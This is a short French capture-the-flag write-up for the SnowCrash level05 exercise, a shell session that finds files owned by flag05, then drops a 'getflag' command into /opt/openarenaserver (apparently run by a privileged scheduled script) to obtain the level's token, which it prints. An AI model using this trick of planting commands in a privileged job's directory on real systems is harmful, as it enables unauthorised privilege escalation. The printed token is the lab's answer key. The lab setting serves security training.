### Comment obtenir le flag
level05@SnowCrash:/$ find -user flag05 2\>/dev/null  
./usr/sbin/openarenaserver  
./rofs/usr/sbin/openarenaserver  
level05@SnowCrash:/$ find -name level05 2\>/dev/null  
./var/mail/level05  
./rofs/var/mail/level05  
level05@SnowCrash:/$ echo "getflag > /tmp/file" > /opt/openarenaserver/file  
level05@SnowCrash:/$ cat /tmp/file  
Check flag.Here is your token : viuaaale9huek52boumoomioc  
